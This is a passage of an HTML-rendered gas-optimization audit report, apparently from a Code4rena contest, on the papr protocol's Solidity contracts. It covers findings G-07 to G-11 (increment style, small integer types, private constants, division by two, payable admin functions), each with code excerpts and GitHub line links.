class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/UniswapHelpers.sol#L2\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/UniswapHelpers.sol#L2</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTEDA</span><span class=\"mtk1\">/</span><span class=\"mtk12\">extensions</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTEDAStarterIncentive</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/extensions/NFTEDAStarterIncentive.sol#L2\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/extensions/NFTEDAStarterIncentive.sol#L2</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTEDA</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">INFTEDA</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/interfaces/INFTEDA.sol#L2\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/interfaces/INFTEDA.sol#L2</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTEDA</span><span class=\"mtk1\">/</span><span class=\"mtk12\">libraries</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EDAPrice</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/libraries/EDAPrice.sol#L2\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/libraries/EDAPrice.sol#L2</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTEDA</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTEDA</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">2</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> &gt;=</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/NFTEDA.sol#L2\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/NFTEDA/NFTEDA.sol#L2</a></p>\n<h2 id=\"g07--i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\" style=\"position:relative;\"><a href=\"#g07--i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\" aria-label=\"g07  i costs less gas than i especially when its used in for loops   ii   too permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑07]  <code>++i</code> costs less gas than <code>i++</code>, especially when it’s used in <code>for</code>-loops (<code>--i</code>/<code>i--</code> too)</h2>\n<p>Saves <strong>5 gas per loop</strong></p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">libraries</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">:                   </span><span class=\"mtk12\">twat</span><span class=\"mtk1\">--;</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/OracleLibrary.sol#L48\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/OracleLibrary.sol#L48</a></p>\n<h2 id=\"g08--usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\" style=\"position:relative;\"><a href=\"#g08--usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\" aria-label=\"g08  usage of uintsints smaller than 32 bytes 256 bits incurs overhead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑08]  Usage of <code>uints</code>/<code>ints</code> smaller than 32 bytes (256 bits) incurs overhead</h2>\n<blockquote>\n<p>When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.</p>\n</blockquote>\n<p><a href=\"https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\">https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html</a></p>\n<p>Each operation involving a <code>uint8</code> costs an extra <a href=\"https://gist.github.com/IllIllI000/9388d20c70f9a4632eb3ca7836f54977\"><strong>22-28 gas</strong></a> (depending on whether the other operand is also a variable of type <code>uint8</code>) as compared to ones involving <code>uint256</code>, due to the compiler having to clear the higher bits of the memory word before operating on the <code>uint8</code>, as well as the associated stack operations of doing so. Use a larger size then downcast where needed.</p>\n<p><em>There are 5 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">libraries</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit int24 twat</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">44</span><span class=\"mtk1\">:               </span><span class=\"mtk12\">twat</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">int24</span><span class=\"mtk1\">(</span><span class=\"mtk12\">delta</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">twapDuration</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/OracleLibrary.sol#L44\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/OracleLibrary.sol#L44</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit uint16 newCount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">438</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">newCount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_vaultInfo</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">][</span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">].</span><span class=\"mtk12\">count</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L438\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L438</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"75\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">UniswapOracleFundingRateController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit uint48 _lastUpdated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">55</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">_lastUpdated</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint48</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit uint48 _lastUpdated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">100</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">_lastUpdated</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint48</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit int56 tickCumulative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">143</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">tickCumulative</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">latestCumulativeTick</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/UniswapOracleFundingRateController.sol#L55\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/UniswapOracleFundingRateController.sol#L55</a></p>\n<h2 id=\"g09--using-private-rather-than-public-for-constants-saves-gas\" style=\"position:relative;\"><a href=\"#g09--using-private-rather-than-public-for-constants-saves-gas\" aria-label=\"g09  using private rather than public for constants saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑09]  Using <code>private</code> rather than <code>public</code> for constants, saves gas</h2>\n<p>If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that <a href=\"https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178\">returns a tuple</a> of the values of all currently-public constants. Saves <strong>3406-3606 gas</strong> in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it’s used, and not adding another entry to the method ID table.</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">UniswapOracleFundingRateController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">25</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targetMarkRatioMax</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">27</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">immutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targetMarkRatioMin</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/UniswapOracleFundingRateController.sol#L25\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/UniswapOracleFundingRateController.sol#L25</a></p>\n<h2 id=\"g10--division-by-two-should-use-bit-shifting\" style=\"position:relative;\"><a href=\"#g10--division-by-two-should-use-bit-shifting\" aria-label=\"g10  division by two should use bit shifting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑10]  Division by two should use bit shifting</h2>\n<p><code>&#x3C;x> / 2</code> is the same as <code>&#x3C;x> >> 1</code>. While the compiler uses the <code>SHR</code> opcode to accomplish both, the version that uses division incurs an overhead of <a href=\"https://gist.github.com/IllIllI000/ec0e4e6c4f52a6bca158f137a3afd4ff\"><strong>20 gas</strong></a> due to <code>JUMP</code>s to and from a compiler utility function that introduces checks which can be avoided by using <code>unchecked {}</code> around the division by two.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">libraries</span><span class=\"mtk1\">/</span><span class=\"mtk12\">UniswapHelpers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TickMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getSqrtRatioAtTick</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TickMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getTickAtSqrtRatio</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint160</span><span class=\"mtk1\">((</span><span class=\"mtk12\">token1ONE</span><span class=\"mtk1\"> &lt;&lt; </span><span class=\"mtk7\">96</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">token0ONE</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/UniswapHelpers.sol#L111\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/UniswapHelpers.sol#L111</a></p>\n<h2 id=\"g11--functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" style=\"position:relative;\"><a href=\"#g11--functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" aria-label=\"g11  functions guaranteed to revert when called by normal users can be marked payable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑11]  Functions guaranteed to revert when called by normal users can be marked <code>payable</code></h2>\n<p>If a function modifier such as <code>onlyOwner</code> is used, the function will revert if a normal user tries to pay the function. Marking the function as <code>payable</code> will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are <code>CALLVALUE</code>(2),<code>DUP1</code>(3),<code>ISZERO</code>(3),<code>PUSH2</code>(3),<code>JUMPI</code>(10),<code>PUSH1</code>(3),<code>DUP1</code>(3),<code>REVERT</code>(0),<code>JUMPDEST</code>(1),<code>POP</code>(2), which costs an average of about <strong>21 gas per call</strong> to the function, in addition to the extra deployment cost.</p>\n<p><em>There are 8 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">350</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">355</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setFundingPeriod</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_fundingPeriod</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">360</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setLiquidationsLocked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">locked</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">365</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setAllowedCollateral</span><span class=\"mtk1\">(IPaprController.CollateralAllowedConfig[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralConfigs</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">366           </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">367           </span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">368:          </span><span class=\"mtk11\">onlyOwner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">382:      </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sendPaprFromAuctionFees</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">386</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">burnPaprFromAuctionFees</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L350\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/PaprController.sol#L350</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PaprToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">24</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyController</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">28</span><span class=\"mtk1\">: 